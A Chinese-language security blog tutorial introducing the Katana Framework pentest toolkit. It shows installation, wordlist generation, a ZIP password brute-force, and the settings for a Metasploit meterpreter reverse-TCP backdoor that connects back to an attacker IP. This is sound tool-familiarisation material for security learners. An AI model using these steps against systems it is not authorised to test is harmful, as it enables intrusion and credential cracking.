**Katana Framework是用Python语言写的渗透框架，但我更觉得它像是一个工具箱，作者**
**是俄罗斯人，该工具集成以下功能:SQL注入、NMAP系统扫描探测、DNS欺骗，DNS伪装、MSF后门、字典生成、邮件炸弹、WHOIS、ARP投毒、对HTTP、SSH、RAR
、ZIP的暴力破解还有部分模块可以对ARP、无线接入点、LAN和WEB进行拒绝服务攻击。**

 **PS：本文仅限于技术分享与讨论，严禁用于非法用途。**

目前katana可以运行在以下的操作系统及分支。

系统分支 | 版本 | 支持 | 已经安装的依赖项目 | 状态  
---|---|---|---|---  
Kali Linux | 4.4.0 | 是  
| 是 | 可工作  
Debian(8) | 4.4.0 | 是 | 是 | 可工作  
Parrot OS |  | 是  
| 是  
| 可工作  
Wifislax |  | 是  
| 是  
| 可工作  
OpenSuse |  | 是  
| 否  
| 可工作  
  
Arch Linux | 4.8.6 | 是  
| 否  
| 可工作  
  
Raspbian | 4.1.7 | 是  
| 否  
| 可工作  
  
Ubuntu | 14.04 | 是  
| 否  
| 可工作  
  
Xbuntu | 4.4.0 | 是  
| 否  
| 可工作  
  
  
## 安装和使用

首先我们使用git命令把它克隆到我们本地，这里我是用的是Centos7 x64

    
    
    git clone https://github.com/PowerScript/KatanaFramework.git  
    

要正常使用该工具我们还需要安装，等待脚本完成安装后，我们在命令行输入ktf.console就可以让它跑起来了。

    
    
    cd KatanaFramework 
    
    
    chmod +x install
    
    
    python install

![Screenshot from 2018-04-23
09-20-01.png](https://image.3001.net/images/20180423/15244465414642.png!small)

其实这个工具跟meta很多特性都很相似，比如每次启动都会有不同的字符画，还有就是设置模块的关键字也是相同的

![Screenshot from 2018-04-23
09-28-34.png](https://image.3001.net/images/20180423/15244469325316.png!small)

输入help可以查看该框架的帮助信息，show modules可以显示所有可用模块

    
    
    show modules

![Screenshot from 2018-04-23
09-36-54.png](https://image.3001.net/images/20180423/1524447549856.png!small)  

比如我们生成一个字典并用来暴力破解Zip压缩文件(当然我们只是做个测试，如果密码复杂的话破解还是得靠运气的)使用use关键字加载一个模块

    
    
    use mcs/gn.words
    
    
    show options

![Screenshot from 2018-04-23
10-22-47.png](https://image.3001.net/images/20180423/15244501899024.png!small)

我们保持参数默认，Run之后在我的home目录生成了一个7m左右的纯数字字典,之后我们载入fle/bt.zip模块

![Screenshot from 2018-04-23
10-48-07.png](https://image.3001.net/images/20180423/15244517003982.png!small)

![Screenshot from 2018-04-23
10-48-57.png](https://image.3001.net/images/20180423/15244517526713.png!small)

现在可以看到已经跑出了密码文件，但是在实际的破解中需要有一个非常强大的字典 。

我们再使用msf后门模块，生成一个后门试试  

![2018-04-23
20-09-15屏幕截图.png](https://image.3001.net/images/20180423/15244854362668.png!small)  

这里我把系统换成了kali,因为这个模块需要调用msfvenom命令，而Centos上安装的msfvenom生成后门一直出错，所以只能用咱们都懂的系统了，我们看到payload选项和encoders有大量的参数可供调用，大家可以根据自己需求填写，

使用set关键字设置参数,这里我把ip设置成攻击机，  

    
    
    set host 192.168.1.132  
    
    
    
    set encoder avoid_underscore_tolower
    再设置一下编码
    
    
    set payload windows/meterpreter/reverse_tcp  
    设置成反向的shell  
    

然后run生成后门文件，只不过msf的木马各大厂商都能识别了，没有好的免杀效果我就不在这里献丑了  

![2018-04-23
20-39-33屏幕截图.png](https://image.3001.net/images/20180423/15244872512748.png!small)  

由于它渗透能力比较弱，我还是觉得这更像个做测试工具包，我在这里就不11演示每个模块了，大家可以自己去探索。  

***本文原创作者：Backspaces，转载请注明来自FreeBuf.COM**

